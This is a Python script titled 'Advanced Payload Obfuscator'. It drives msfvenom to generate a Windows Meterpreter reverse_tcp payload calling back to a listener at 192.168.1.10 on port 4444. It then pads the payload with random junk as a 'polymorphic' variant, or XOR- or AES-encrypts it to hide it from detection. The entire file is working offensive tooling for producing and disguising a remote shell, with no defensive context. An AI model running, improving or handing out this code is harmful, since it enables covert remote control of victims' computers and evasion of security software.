import os
import argparse
import random
import string
from Crypto.Cipher import AES
from stegano import lsb
import socket
import threading
import sys
import subprocess

# === Payload Generator ===
def generate_payload(output_file="output/payload.bin"):
    os.makedirs("output", exist_ok=True)
    try:
        subprocess.run(["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp", "LHOST=192.168.1.10", "LPORT=4444", "-f", "raw", "-o", output_file], check=True)
        print(f"[+] Payload generated: {output_file}")
    except FileNotFoundError:
        print("[ERROR] msfvenom not found. Please install Metasploit.")
    except subprocess.CalledProcessError:
        print("[ERROR] msfvenom command failed. Check your configuration.")

# === Polymorphic Payload Generator ===
def generate_polymorphic_payload(output_file="output/polymorphic_payload.bin"):
    os.makedirs("output", exist_ok=True)
    junk_code = ''.join(random.choices(string.ascii_letters + string.digits, k=100))
    try:
        with open("output/payload.bin", "rb") as f:
            payload = f.read()
        polymorphic_payload = junk_code.encode() + payload + junk_code.encode()
        with open(output_file, "wb") as f:
            f.write(polymorphic_payload)
        print(f"[+] Polymorphic Payload generated: {output_file}")
    except FileNotFoundError:
        print("[ERROR] Base payload not found. Generate it first.")

# === XOR Obfuscation ===
def xor_encrypt(input_file, output_file):
    os.makedirs("output", exist_ok=True)
    key = random.randint(1, 255)
    try:
        with open(input_file, "rb") as f:
            payload = f.read()
        encrypted_payload = bytes([b ^ key for b in payload])
        with open(output_file, "wb") as f:
            f.write(bytes([key]) + encrypted_payload)
        print(f"[+] XOR Encryption applied. Output: {output_file}")
    except FileNotFoundError:
        print("[ERROR] Input file not found for XOR encryption.")

# === AES Encryption ===
def aes_encrypt(input_file, output_file):
    os.makedirs("output", exist_ok=True)
    key = os.urandom(16)
    try:
        cipher = AES.new(key, AES.MODE_EAX)
        with open(input_file, "rb") as f:
            payload = f.read()
        ciphertext, tag = cipher.encrypt_and_digest(payload)
        with open(output_file, "wb") as f:
            f.write(cipher.nonce + tag + ciphertext)
        with open("output/aes_key.bin", "wb") as f:
            f.write(key)
        print(f"[+] AES Encryption applied. Output: {output_file}")
    except FileNotFoundError:
        print("[ERROR] Input file not found for AES encryption.")

# === Main CLI ===
def main():
    parser = argparse.ArgumentParser(description="Advanced Payload Obfuscator")
    parser.add_argument("-g", "--generate", help="Generate payload", action="store_true")
    parser.add_argument("-gp", "--generate-polymorphic", help="Generate polymorphic payload", action="store_true")
    parser.add_argument("-o", "--obfuscate", choices=["xor", "aes"], help="Obfuscation method")
    args = parser.parse_args()
    
    if args.generate:
        generate_payload()
    if args.generate_polymorphic:
        generate_polymorphic_payload()
    if args.obfuscate:
        if args.obfuscate == "xor":
            xor_encrypt("output/payload.bin", "output/obfuscated_payload.bin")
        else:
            aes_encrypt("output/payload.bin", "output/obfuscated_payload.bin")

if __name__ == "__main__":
    main()
